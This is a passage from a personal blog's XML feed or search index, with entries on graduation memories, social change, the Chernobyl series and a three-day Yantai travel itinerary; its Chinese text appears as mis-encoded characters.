·å´å·²æ¸æ¸æ¨¡ç³Šã€‚</p><p>åˆ°äº†æ‹æ¯•ä¸šç…§é‚£å¤©ï¼Œæˆ‘ä»¬ç­åœ¨æ ¡é—¨å£æ‹äº†ä¸€å¼ å ªç§°æµ·æŠ¥çš„æ¯•ä¸šé›†ä½“ç…§ï¼Œä¹‹åçš„è‡ªç”±æ‹ç…§æ—¶é—´ä¾¿æ˜¯æˆ‘æ‹™åŠ£çš„ PS å¤§æ˜¾ç¥é€šçš„æ—¶å€™äº†ã€‚</p><p>ç¦»æ ¡é‚£å¤©ï¼Œè™½ç„¶æˆ‘å®¶è·ç¦»å­¦æ ¡åªæœ‰ä¸€å°æ—¶è½¦ç¨‹ï¼Œä½†æˆ‘å› æ— æ³•æ‰¿å—ç©ºè¡è¡çš„å®¿èˆæ‰€å¸¦æ¥çš„ç¦»åˆ«ä¹‹æƒ…è€Œç¬¬ä¸€ä¸ªç¦»å¼€ã€‚å½¼æ—¶çš„æˆ‘å¯èƒ½æƒ³è¿‡æ­¤å»ç»å¹´ï¼Œå´æœªæ›¾æ„Ÿå—è¿‡ç‰©æ˜¯äººéã€ç›¸è§æ— è¨€ã€‚</p><p>è™½ç„¶ç§‘æŠ€çš„å‘å±•è®©æ²Ÿé€šæ›´åŠ çš„ä¾¿æ·ï¼Œä½†å¹¶æ²¡æœ‰è®©æˆ‘çš„è”ç³»äººåˆ—è¡¨æ›´åŠ åœ°æ´»è·ƒï¼›è™½ç„¶å‘è¾¾çš„äº¤é€šè®©æˆ‘ä»¬ä¸€æ—¥åƒé‡Œï¼Œä½†æˆ‘å¯èƒ½ä¼šç‚¹ä¸ªå¤–å–ï¼Œåœ¨æŠ–éŸ³ä¸­ä¸€çª¥æˆ‘æœªæ›¾åˆ°è¿‡çš„åœ°æ–¹ã€‚åœ¨è¢«ç”Ÿæ´»è£¹æŒŸç€çš„æ³¢æ¶›ä¸­ï¼Œå¯èƒ½æ˜¯æ—¶å€™æ”¾ä¸‹æ‰‹æœºï¼Œèµ°å‡ºå®¶é—¨ï¼Œä¼šä¼šè€å‹ï¼Œçœ‹çœ‹ä¸–ç•Œã€‚</p><p>è¿˜è®°å¾—åœ¨æ¯•ä¸šæ—¶çš„è‡ªæˆ‘è¯„ä»·ä¸Šå†™é“â€œè™½ç„¶ä»Šå¤©èµ°å‡ºäº†æ ¡å›­ï¼Œä½†æˆ‘åˆšåˆšè¸å…¥äº†ç¤¾ä¼šè¿™æ‰€å¤§å­¦ï¼Œè¿˜æœ‰å¾ˆå¤šä¸œè¥¿éœ€è¦ä¸æ–­åœ°å­¦ä¹ ã€‚äººå¯ä»¥ä¸ä¸Šå­¦ï¼Œä½†ä¸å¯ä»¥ä¸å­¦ä¹ ã€‚â€ã€‚æ¯•ä¸šçš„è¿™äº›å¹´ï¼Œèµ°è¿‡ä½è°·ï¼Œèµ°è¿‡å¹³æ·¡ï¼Œèµ°è¿‡æ¬£å–œï¼Œä¹Ÿèµ°è¿‡è¿·èŒ«ï¼Œå¥½åœ¨æ— è®ºä»€ä¹ˆæ ·çš„æ—¥å­ï¼Œæœ€åéƒ½æŒºäº†è¿‡æ¥ï¼Œ<br>åº†å¹¸è‡ªå·±ä»ä¸å¿˜åˆå¿ƒï¼Œæ²¡æœ‰è¢«æ—¶é—´å’Œç°å®æ‰€æ‰“è´¥ã€‚æ„Ÿè°¢ 3 å¹´å‰é‚£ä¸ªåˆšè¿‡å®Œ 24 å²ç”Ÿæ—¥çš„å°‘å¹´ï¼Œåœ¨ä¼—äººçš„åå¯¹å£°ä¸­ï¼Œæ¯…ç„¶è¸ä¸Šå¼€å¾€åŒ—äº¬çš„ç«è½¦ï¼Œå› ä¸ºä»–æ˜ç™½ï¼šå¯æ€•çš„ä¸æ˜¯æœ‰æƒ³æ³•ï¼Œè€Œæ˜¯ä¸å†æœ‰æƒ³æ³•ã€‚</p><p>åœ¨å®‰é€¸çš„ç”Ÿæ´»ä¸­ï¼Œä¼šè®©äººä¸§å¤±æ–—å¿—ï¼Œå°†å®è´µçš„æ—¶é—´æ¶ˆç£¨åœ¨æŠ–éŸ³çš„æ¬¢ç¬‘ä¸­ï¼Œæ˜æ˜Ÿçš„ç»¯é—»ä¸­ä»¥åŠåœ¨æ²‰è¿·ä¹‹åçš„ç©ºè™šè¿·èŒ«ä¸­ã€‚å½“ä½ è§‰å¾—æœ€å¥½çš„æ—¶å€™ï¼Œå¯èƒ½æ˜¯ä½ æœ€åçš„æ—¶å€™ï¼šä½ çš„æ–—å¿—å¼€å§‹éº»ç—¹ï¼Œçœ¼å‰çš„ç¹è£å¼€å§‹è’™è”½åŒçœ¼ï¼›å½“ä½ è§‰å¾—æœ€åçš„æ—¶å€™ï¼Œå¯èƒ½æ˜¯ä½ æœ€å¥½çš„æ—¶å€™ï¼Œå› ä¸ºä½ å·²ç»æ„è¯†åˆ°äº†é—®é¢˜ï¼Œå¹¶å¼€å§‹ç€åŠ›æ”¹æ­£ã€‚å±…å®‰æ€å±ï¼Œé«˜ç»è¿œç©ï¼Œæ–¹èƒ½å†³èƒœæœªæ¥ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å˜</title>
      <link href="/post/change/"/>
      <url>/post/change/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/large/006tNc79ly1g43xynalhaj30kf0b4dil.jpg" alt=""></p><p>ä»Šå¤©çœ‹åˆ°ä¸­å›½æ”¿åŠ¡å¹³å°æœåŠ¡åœ¨å¾®ä¿¡å’Œæ”¯ä»˜å®éƒ½ä¸Šçº¿äº†ï¼Œè¿˜æœ‰å¾ˆå¤šåœ°æ–¹çš„æœåŠ¡åå–çš„éƒ½å¾ˆæ–‡é›…ï¼Œé¢‡æœ‰ä¸€äº›æ„Ÿè§¦ï¼Œæ•…ä½œæ­¤æ–‡ã€‚</p><a id="more"></a><p>ä¿¡æ¯é©å‘½å°†è®¸å¤šçº¿ä¸‹æ´»åŠ¨æ¬åˆ°äº†çº¿ä¸Šï¼Œæ¶ˆç­äº†è®¸å¤šä½æ•ˆé‡å¤çš„å·¥ä½œã€‚å°æ—¶å€™è§‰å¾—ï¼Œè¯¾æœ¬ä¸Šå†™çš„â€œè¶³ä¸å‡ºæˆ·ï¼Œå°½çŸ¥å¤©ä¸‹äº‹â€ç¦»æˆ‘ä»¬è¿˜å¾ˆè¿œï¼Œä½†å¦‚ä»Šï¼Œæˆ‘ä»¬å´æ—©å·²ä¹ æƒ¯ï¼Œä¼¼ä¹è®¤ä¸ºè¿™ä¸ªä¸–ç•Œæœ¬æ¥å°±æ˜¯è¿™æ ·ã€‚</p><p>ä¿¡æ¯é©å‘½ä¸ä»…å¸¦æ¥äº†ä¾¿æ·ï¼Œä¹Ÿå¸¦æ¥äº†æ›´å¤§çš„è´«å¯Œå·®è·ã€‚æ–°æŠ€æœ¯çš„ä¸æ–­æ¶Œç°å–ä»£äº†å¤§é‡çš„é‡å¤åŠ³åŠ¨ï¼Œä¸æ–­æå‡å°±ä¸šé—¨æ§›ï¼Œè®©é‚£äº›å°å­¦åˆä¸­æ¯•ä¸šçš„äººéšç€å¹´é¾„çš„å¢é•¿è¶Šæ¥è¶Šéš¾ä»¥å°±ä¸šï¼Œéšç€ AI çš„åˆ°æ¥ï¼Œå°†ä¼šæœ‰æ›´å¤šçš„èŒä¸šå°†ä¼šè¢«æœºå™¨æ‰€å–ä»£ã€‚</p><p>åœ¨æ´ªæ°´èˆ¬çš„èµ„è®¯ä¸æ‚è®¯é—´ï¼Œæ€æ ·æ‰èƒ½é«˜æ•ˆè·å–åˆ°èµ„è®¯ï¼Ÿä½ æ˜¯ä¸€å¹´è¿‡äº† 365 å¤©ï¼Œè¿˜æ˜¯è¿‡äº† 1 å¤©é‡å¤äº† 364 å¤©ï¼Ÿéšç€ç§»åŠ¨äº’è”ç½‘çš„æ™®åŠï¼Œè¶Šæ¥è¶Šå¤šçš„äººæ”¾ä¸‹æŠ¥çº¸å’Œå›¾ä¹¦ï¼Œæ‹¿èµ·æ‰‹æœºè¿›å…¥ç›´æ’­é—´ã€‚è€Œé‚£äº›çŸ¥é“è‡ªå·±è¦å»å¾€ä½•æ–¹å¹¶å§ä¸ä¸ºé€”ä¸­èŠ±é¦™æ‰€åŠ¨çš„äººï¼Œç»ˆå°†ä¸»å®°è¿™ä¸ªä¸–ç•Œã€‚</p><p>åœ¨äººç±»å†å²çš„é•¿æ²³ä¸­ï¼Œè¿‡å»çš„æ•°ä¸‡å¹´éƒ½åœ¨å¹³ç¼“çš„å‘å±•ï¼Œåœ¨å·¥ä¸šé©å‘½ä¹‹åï¼Œäººç±»è¿›å…¥çˆ†ç‚¸å¼å¢é•¿çš„æ—¶ä»£ï¼Œè€Œä¸”å¢é•¿é€Ÿåº¦è¶Šæ¥è¶Šå¿«ï¼Œè°èƒ½é«˜ç»è¿œç©ï¼Œè°å°±èƒ½åœ¨æœªæ¥æŒæ§è¯è¯­æƒã€‚</p><p>5G å¤§æˆ˜ä¸€è§¦å³å‘ï¼Œä¸‹ä¸€ä¸ªåå¹´ï¼Œä¼šæ¯”è¿‡å»çš„åå¹´å˜åŒ–æ›´ä¸ºå‰§çƒˆã€‚ä¸€æ—¥åƒé‡Œå³å°†åˆ°æ¥ï¼Œå†å²ä¼šæ— æƒ…åœ°å°†é‚£äº›ç‹‚å¦„è‡ªå¤§çš„äººæŠ›å¼ƒï¼Œå”¯æœ‰å˜é©ï¼Œæ‰èƒ½å é¢†æœªæ¥é«˜åœ°ã€‚</p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43xl49hg6j30u01qrac7.jpg" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> éšç¬”æ‚è°ˆ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆ‡å°”è¯ºè´åˆ©</title>
      <link href="/post/chernobyl/"/>
      <url>/post/chernobyl/</url>
      
        <content type="html"><![CDATA[<p><img src="https://pic4.zhimg.com/v2-d83325c04c1aa47d115a9919e1d96c5e_1200x500.jpg" alt=""></p><blockquote><p>What is the cost of lies?</p><a id="more"></a><p>Itâ€™s not that weâ€™ll mistake them for the truth.</p><p>The real danger is that if we hear enough lies, then we no longer recognize the truth at all.</p><p>What can we do then?</p><p>What else is left but to abandon even the hope of truth and content ourselves instead with stories?</p></blockquote><p>å½“ä½ è¦è¢«çˆ†å¤´æ—¶ï¼ŒçœŸç›¸è¿˜é‡è¦å—ï¼Ÿ</p><p>åœ¨è°è¨€ä¸çœŸç›¸ä¹‹é—´ï¼Œé‚£äº›å‹‡æ•¢ç«™å‡ºæ¥çš„å‹‡å£«ï¼Œç”¨ç”Ÿå‘½ä¸ºé»‘æš—é€æ¥ä¸€æŸé˜³å…‰ï¼Œä¸æ‡ˆçš„åšæŒæœ€ç»ˆæ‹¯æ•‘äº†æ•°ä¸‡äººçš„ç”Ÿå‘½ã€‚</p><p>è°è¨€å¯ä»¥éº»ç—¹ï¼ŒçœŸç›¸ä¸ä¼šæ¶ˆå¤±ã€‚æ€»æœ‰ä¸€å¤©ï¼Œç¾éš¾ä¼šå¸¦æ¥æ‰€æœ‰çœŸç›¸é€æ¥çš„ç¤¼ç‰©ã€‚</p><p>åœ¨ç¾éš¾é¢å‰ï¼Œæˆ‘æ˜¯å¦èƒ½åƒæ¶ˆé˜²å‘˜ã€æ°´å¤«ã€çŸ¿å·¥ã€åˆ—åŠ ç´¢å¤«ã€è°¢å°”æ¯”çº³ä¸€æ ·å†²é”‹é™·é˜µï¼Œå‹‡æ•¢ç«™å‡ºæ¥è¯´å‡ºçœŸç›¸ï¼Ÿæˆ‘ä¸çŸ¥é“ã€‚åªæ˜¯ä»å†…å¿ƒç”±è¡·çš„æ•¬ä½©ä»–ä»¬ã€‚</p><p>å†å²ä¸ä¼šè¿œå»ï¼Œå†å²æ¯å¤©éƒ½åœ¨ä¸Šæ¼”ã€‚å¦‚æœä¸æ˜¯è‹è”å€’å°ï¼Œè¿™ä»¶äº‹ä¸­æ— æ•°çš„è‹±é›„éƒ½å°†è¢«åŸ‹æ²¡ï¼Œé‚£äº›ç½ªé­ç¥¸é¦–ä¹Ÿä¼šé£˜æ•£åœ¨å†å²çš„é£ä¸­ï¼Œè€ŒçœŸç›¸åˆ™é€æ¸è¢«äººä»¬æ‰€é—å¿˜â€¦â€¦</p><p>ä½ æ‰€äº†è§£çš„ï¼Œåªæ˜¯ä»–ä»¬æƒ³è®©ä½ äº†è§£çš„ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> å½±åƒå¿— </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€åŸä¸€å‘³Â·çƒŸå°</title>
      <link href="/post/yantai/"/>
      <url>/post/yantai/</url>
      
        <content type="html"><![CDATA[<p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wri08odj314q0u01cs.jpg" alt=""></p><p>å»è¿‡ä»–äººå¤ªå¤šå»è¿‡çš„è¿œæ–¹ï¼Œæ­¤åˆ»åªæ„¿æ’·å–ä»–äººæœªæ›¾åˆ°è¿‡çš„å®é™ä¹‹éš…ã€‚</p><a id="more"></a><p>çƒŸå°ï¼Œä¸€åº§æµ·æ»¨åŸå¸‚ï¼Œè™½ä¹…é—»å¤§åï¼Œä½†ä¸€æåˆ°çœ‹æµ·ï¼Œè„‘æµ·ä¸­é¦–å…ˆæµ®ç°è¿˜æ˜¯é’å²›ï¼Œå¤§è¿ç­‰ï¼Œæèµ·çƒŸå°ï¼Œä¼¼ä¹æ²¡æœ‰å¤ªå¤šå¦‚é›·è´¯è€³çš„é£æ™¯ã€‚ä½†è€å®¶æ˜¯çƒŸå°çš„åŒäº‹æåŠ›æ¨èï¼Œæ­£å¥½ç«¯åˆèŠ‚ä¹Ÿå¯ä»¥å‡ºå»æ”¾æ¾ä¸€ä¸‹ï¼Œå…å¾—åœ¨å®¶ç»´æŠ¤ä¸–ç•Œå’Œå¹³ã€‚è¯´èµ°å°±èµ°ï¼Œæå‰åŠä¸ªæœˆå·²ç»æŠ¢ä¸åˆ°ç«è½¦ç¥¨ï¼Œåªå¥½è½¬è€Œè´­ä¹°æ±½è½¦ç¥¨ï¼Œç„¶åå¼€å§‹è§„åˆ’è¡Œç¨‹ã€‚6 æœˆ 6 æ—¥ä¸‹åˆï¼Œé«˜è€ƒå‰å¤•æˆ‘è¸ä¸Šäº†çƒŸå°ä¹‹æ—…ã€‚</p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wjw5ne7j30u01901kg.jpg" alt="Sunshine 100"></p><p>æˆ‘æ‰€é¢„å®šçš„å®¢æ ˆåœ¨é˜³å…‰ 100ï¼Œè·ç¦»ç«è½¦ç«™å’Œæ±½è½¦ç«™æ­¥è¡Œè·¯ç¨‹å·®ä¸å¤šéƒ½åœ¨ååˆ†é’Ÿã€‚<br>çƒŸå°å…¬äº¤å¯å‡å¯åˆ·å¾®ä¿¡ã€æ”¯ä»˜å®ä¹˜è½¦ç <br>çƒŸå°æ™¯ç‚¹çš„ä¼˜æƒ ç¥¨éƒ½æ˜¯åœ¨æ£€ç¥¨å£éªŒæ˜è¯ä»¶ã€‚</p><h2 id="Day-1"><a href="#Day-1" class="headerlink" title="Day 1"></a>Day 1</h2><p>ä¸Šåˆå¯ä»¥è§†æƒ…å†µä¼‘æ¯æˆ–è€…å‡ºå»æ¸¸ç©ã€‚çƒŸå°å¸‚åŒºå†…çš„çƒŸå°å±±ã€å„å›½ä½¿é¦†é—å€ã€æ»¨æµ·æ™¯åŒºå‡æœ‰ä¸é”™çš„é£æ™¯ã€‚è€Œä¸”å‡ç›¸è·ä¸è¿œã€‚</p><h3 id="ä½¿é¦†é—å€"><a href="#ä½¿é¦†é—å€" class="headerlink" title="ä½¿é¦†é—å€"></a>ä½¿é¦†é—å€</h3><p>ç¥¨ä»·ï¼šå…è´¹<br>ä» 1862 å¹´è‹±æ³•åœ¨çƒŸå°å»ºç«‹äº†ä½¿é¦†åï¼Œå…ˆåå…±æœ‰ 17 ä¸ªå›½å®¶å»ºç«‹äº†ä½¿é¦†ï¼Œä¸åŒé£æ ¼çš„ä½¿é¦†ä¹Ÿæ˜¯ä¸€å¤§çœ‹ç‚¹ã€‚</p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wow5e8aj31900u0b2a.jpg" alt=""></p><h3 id="çƒŸå°å±±"><a href="#çƒŸå°å±±" class="headerlink" title="çƒŸå°å±±"></a>çƒŸå°å±±</h3><p>ç¥¨ä»·ï¼šå…è´¹<br>ä»å®¢æ ˆåˆ°çƒŸå°å±±æ­¥è¡Œè·ç¦» 2 å…¬é‡Œå·¦å³ã€‚é™¤äº†ç™»çƒŸå°å±±ç¯å¡”éœ€è¦ 10 å…ƒå¤–ï¼Œæ•´ä¸ªå…¬å›­å†…æ²¡æœ‰å…¶ä»–é—¨ç¥¨é¡¹ç›®ã€‚ä¸è¿‡æ¨èåœ¨ç¯å¡”çœºæœ›å‘¨å›´æµ·æ™¯ä¸çƒŸå°å¸‚åŒºï¼Œè¿™ä¸ªä»·æ ¼ç»å¾—å€¼å¾—ã€‚</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wlmtimjj31900u0qv5.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wpj9n65j31900u0u0x.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wsipuawj31400u04qs.jpg" alt=""></p><h3 id="æ»¨æµ·æ™¯åŒº"><a href="#æ»¨æµ·æ™¯åŒº" class="headerlink" title="æ»¨æµ·æ™¯åŒº"></a>æ»¨æµ·æ™¯åŒº</h3><p>ç¥¨ä»·ï¼šå…è´¹<br>æµ·é£æ‹‚åŠ¨å‘æ¢¢ã€æµ·æµªäº²å»ç€è„šä¸«ã€å„¿ç«¥ä»¬å †ç€æ²™æ»©åŸå ¡ã€è¿˜æœ‰ä¸€ç¾¤å¹´è½»äººåœ¨å¹¿åœºç»ƒä¹ ç€æ»‘æ¿â€¦â€¦å¦‚æ­¤æƒ¬æ„çš„åˆåé˜³å…‰ï¼Œå¤šä¹ˆå¸Œæœ›æ—¶å…‰å°±æ­¤å‡ç»“â€¦â€¦</p><p>å¦‚æœæ™šä¸Šè¿˜æœ‰ç²¾åŠ›ï¼Œå¯ä»¥ç»§ç»­çœ‹ä¸‹å¤œæ™¯ã€‚ç”±äºæˆ‘æ—©ä¸Š 4 ç‚¹åŠåˆ°äº†åå°±æ²¡æœ‰ä¼‘æ¯ï¼Œæ™šä¸Šå®åœ¨å¤ªç´¯äº†ï¼Œæ²¡èƒ½çœ‹åˆ°å¤œæ™¯ï¼Œä¸€å¤§é—æ†¾å•Šã€‚</p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wm52jcoj31900u0npd.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wmcv8yuj31900u0qv5.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wmlxsp5j31900u0kjl.jpg" alt=""></p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wlbsf05j316a0u0thg.jpg" alt="City on Bubble"></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wmvcgzyj30u01404ls.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43woomamyj30u0190k4v.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wp8cgm6j31900u0kjl.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wx12qdlj31900u0b29.jpg" alt=""></p><h2 id="Day-2"><a href="#Day-2" class="headerlink" title="Day 2"></a>Day 2</h2><p>æå‰è´­ä¹°çƒŸå°åˆ°è“¬è±ä¸è¿”ç¨‹çš„åŠ¨è½¦ï¼Œå•ç¨‹ç¥¨ä»· 20 å…ƒï¼Œè¡Œç¨‹åŠå°æ—¶ã€‚</p><h3 id="è“¬è±é˜"><a href="#è“¬è±é˜" class="headerlink" title="è“¬è±é˜"></a>è“¬è±é˜</h3><p>ç¥¨ä»·ï¼š120 å…ƒ/äººï¼Œä¼˜æƒ ä»·åŠä»·<br>çº¿è·¯ï¼šç«è½¦ç«™ 3ã€7 è·¯å‡å¯ç›´è¾¾<br>å¿«è‰‡ï¼š50 å…ƒ/äºº<br>æ¸¸è‰‡ï¼š200 å…ƒ/äºº<br>6 ç‚¹åŠå·¦å³æŠµè¾¾è“¬è±ç«™ï¼Œéšåä¹˜å 3ã€7 è·¯å…¬äº¤åˆ°è¾¾è“¬è±é˜ï¼ˆå¤§çº¦ 1 å°æ—¶ï¼‰ï¼Œåƒè¿‡æ—©é¥­åå‰å¾€è´­ç¥¨ã€‚<br>é¦–å…ˆè¿›å…¥çš„æ˜¯é¾™ç‹å®«ã€å¤©åå®«ç­‰å¤åˆ¹ç¾¤ï¼Œæ¸¸ç©å®Œæ¯•åå¯é€šè¿‡è¥¿é—¨åˆ°è¾¾è“¬è±å†°å®«ã€æ¨ªå±±å¹¿åœºã€ç¯å¡”ã€é»„æ¸¤æµ·åˆ†ç•Œçº¿ç­‰æ™¯åŒºï¼Œåœ¨é‡‘é¾Ÿæ¢æµ·å¤„å¯ä¹˜åæ¸¸è‰‡å‰å¾€å…«ä»™è¿‡æµ·ï¼Œæ¸¸è‰‡ä¸Šå¯ä»¥æŠ•å–‚æµ·é¸¥ï¼Œä¹Ÿæ˜¯ä¸€å¤§ä¹è¶£ã€‚</p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wpylyyxj31900u0e82.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/middle/006tNc79ly1g43wq3b4ujj31900u0x6p.jpg" alt=""></p><h3 id="å…«ä»™è¿‡æµ·"><a href="#å…«ä»™è¿‡æµ·" class="headerlink" title="å…«ä»™è¿‡æµ·"></a>å…«ä»™è¿‡æµ·</h3><p>ç¥¨ä»·ï¼š80 å…ƒ/äººï¼Œä¼˜æƒ  70 å…ƒ/äºº<br>å…«ä»™è¿‡æµ·ä¸»è¦å°±æ˜¯äº†è§£ä¸‹å…«ä»™è¿‡æµ·çš„æ•…äº‹ï¼Œæ•´ä¸ªæ™¯åŒºä¸ºè‘«èŠ¦çš„å½¢çŠ¶ï¼Œæˆ‘ä»¬æ¸¸è‰‡ç™»é™†çš„æ˜¯æ™¯åŒºçš„åé—¨ï¼Œæ‰€ä»¥ä¸å¤ªæ„Ÿå…´è¶£çš„è¯å¯ä»¥é€‰æ‹©ä¸€ä¾§ä»å‰é—¨å‡ºå»ï¼Œæ¯”è¾ƒèŠ‚çº¦æ—¶é—´ã€‚<br>è¯¥æ™¯åŒºå†…å¯ä»¥ç™»ä¼šä»™é˜çœºæœ›æ•´ä¸ªæ™¯åŒºå’Œæµ·æ™¯ï¼Œæ—¶è€Œä¼šæœ‰ä¸€ç¾¤æµ·é¸¥ä»çœ¼å‰ç•¥è¿‡ï¼Œé£æ™¯è¿˜è›®ä¸é”™çš„ã€‚</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wqjg9mwj31900u0e81.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wqqedzbj30u0190npd.jpg" alt=""></p><p><img src="http://ww3.sinaimg.cn/middle/006tNc79ly1g43wr2jiluj31400u0e81.jpg" alt=""></p><p>åœ¨è“¬è±é˜ã€å…«ä»™è¿‡æµ·ã€ä¸‰ä»™å±±ä»»ä¸€æ™¯ç‚¹è´­ä¹°åˆ«å¤„æ™¯ç‚¹é—¨ç¥¨å¯å‡­é—¨ç¥¨å…è´¹ä¹˜åè§‚å…‰è½¦æŠµè¾¾ã€‚æˆ‘ä»¬åœ¨å…«ä»™è¿‡æµ·è´­ä¹°äº†æåœ°æµ·æ´‹ä¸–ç•Œçš„é—¨ç¥¨ã€‚æ­¤æ—¶æ—¶é—´ 11 ç‚¹å¤šï¼Œæˆ‘ä»¬å°±åœ¨å‘¨è¾¹çš„æ²™æ»©ç©äº†ä¸€ä¼šå„¿ï¼Œåˆåƒè¿‡åˆé¥­åï¼Œ1 ç‚¹é’Ÿåˆ°è¾¾æµ·æ´‹é¦†ã€‚</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wrc000vj31400u04da.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43wri08odj314q0u01cs.jpg" alt=""></p><h3 id="æåœ°æµ·æ´‹ä¸–ç•Œ"><a href="#æåœ°æµ·æ´‹ä¸–ç•Œ" class="headerlink" title="æåœ°æµ·æ´‹ä¸–ç•Œ"></a>æåœ°æµ·æ´‹ä¸–ç•Œ</h3><p>ç¥¨ä»·ï¼š150 å…ƒ/äººï¼Œä¼˜æƒ  130 å…ƒ/äºº</p><p>æµ·æ´‹é¦†ä¸­æœ‰å„è‰²é‡‘é±¼ã€é²¨é±¼ã€ä¹Œé¾Ÿã€æ°´æ¯ç­‰ï¼Œçœ‹å¾—çœ¼èŠ±ç¼­ä¹±ï¼Œè¿™ç§åŠ¨ç‰©éƒ½æœ‰è‡ªå·±ç”Ÿå­˜çš„æ‹¿æ‰‹æœ¬é¢†ï¼šç”µé³—çš„ç¬æ—¶ç”µå‹å¯è¾¾ 240V+ï¼Œå¸ç›˜é±¼é€šè¿‡å¸é™„å…¶å®ƒå¤§å‹é±¼ç±»æˆ–å°èˆ¹æ­é¡ºé£è½¦æ¥èŠ‚çœè‡ªå·±çš„ä½“åŠ›â€¦â€¦è¿˜æœ‰ç„¦èºä¸å®‰çš„åŒ—æç†Šï¼Œè²Œä¼¼æ­£å¤„åœ¨å‘æƒ…æœŸçš„æµ·ç‹®ç­‰ï¼Œéƒ½ç•™ä¸‹äº†å¾ˆæ·±åˆ»çš„å°è±¡ï¼Œä¸å¾—ä¸æ„Ÿå¹å¤§è‡ªç„¶çš„é¬¼æ–§ç¥å·¥ï¼Œå„ç§ç”Ÿç‰©çš„ç”Ÿå­˜æœ¬é¢†çœŸå®å…«ä»™è¿‡æµ·ï¼Œå„æ˜¾ç¥é€šã€‚</p><p>æµ·æ´‹ä¸–ç•Œä¸­å…¨å¤©å®šæ—¶æœ‰ç¾äººé±¼å’Œæµ·è±šã€æµ·ç‹®çš„è¡¨æ¼”ï¼Œéƒ½è¿˜è›®ä¸é”™çš„ã€‚æµ·è±šã€æµ·ç‹®è¡¨æ¼”ä½äºæœ€é¡¶å±‚ï¼Œçœ‹åˆ°è¿™é‡Œæµ·æ´‹é¦†ä¹‹è¡Œä¹Ÿå°±ç»“æŸäº†ï¼Œå‡ºå£çš„è·¯çº¿å‡ ä¹å°±éƒ½æ˜¯å„ç§å•†å“äº†ã€‚</p><p>ä»æµ·æ´‹é¦†å‡ºæ¥æ—¶æ‰ 4 ç‚¹åŠï¼Œå‡ºé—¨å³è½¬ 200 ç±³å°±æœ‰ 3  è·¯å…¬äº¤è½¦ï¼Œå¯ä»¥ç›´è¾¾ç«è½¦ç«™å€™è½¦ä¼‘æ¯è¿”ç¨‹äº†ã€‚å¦‚æœæ™šä¸Šå›å»ç²¾åŠ›è¿˜ä¸é”™ï¼Œè¿˜å¯ä»¥åœ¨çƒŸå°å¸‚åŒºçœ‹çœ‹å¤œæ™¯ :-)</p><p><img src="http://ww2.sinaimg.cn/middle/006tNc79ly1g43wrw8x35j31900u0e82.jpg" alt=""></p><p><img src="http://ww4.sinaimg.cn/middle/006tNc79ly1g43ws4iv9kj31900u0u0x.jpg" alt=""></p><h2 id="Day-3"><a href="#Day-3" class="headerlink" title="Day 3"></a>Day 3</h2><h3 id="å…»é©¬å²›"><a href="#å…»é©¬å²›" class="headerlink" title="å…»é©¬å²›"></a>å…»é©¬å²›</h3><p>ç¥¨ä»·ï¼šå…è´¹<br>å…»é©¬å²›ä¸ºé€†æ—¶é’ˆå•è¡Œçº¿ï¼Œæ¨èè‡ªé©¾ï¼Œå²›ä¸­ä¹Ÿæœ‰å…±äº«ç”µåŠ¨è½¦ä¸è‡ªè¡Œè½¦å¯ä¾›ç§Ÿèµï¼Œä½†ç”µåŠ¨è½¦ä»·æ ¼å¯ä»¥è¯´æ˜¯å¾ˆè´µäº†ã€‚</p><p>ä¹˜åæ¸¸ 1 æˆ– 61 è·¯è½¬ 617 è·¯å¯ä»¥åˆ°è¾¾å…»é©¬å²›ï¼Œè¡Œç¨‹å¤§çº¦ 1 å°æ—¶ã€‚åœ¨å¤©é©¬å¹¿åœºä¸‹è½¦åï¼Œå¯ä»¥å¿«é€Ÿæ¸¸è§ˆä¸€ä¸‹å¤©é©¬å¹¿åœºï¼Œç„¶åç›´è¡Œ 2 å…¬é‡Œå·¦å³åˆ°é è¿‘é»„æµ·çš„æµ·å²¸çº¿ï¼Œè¿™é‡Œçš„æ°´çœŸçš„æ˜¯æ¸…æ¾ˆè§åº•ï¼Œæœ‰çš„åœ°æ–¹çŸ³å¤´æ˜¯è¤è‰²ä¸ºä¸»ï¼Œæœ‰çš„åˆ™æ˜¯é»‘ç™½ç›¸é—´ï¼Œè¿˜æœ‰çš„æµ·å²¸ä¸€æ¡æ¡çš„ç»¿è‰²æµ·è—»å¸¦ï¼Œéå¸¸æ¼‚äº®ã€‚æ²™æ»©ä¸Šè¿˜æœ‰äº”é¢œå…­è‰²çš„ç 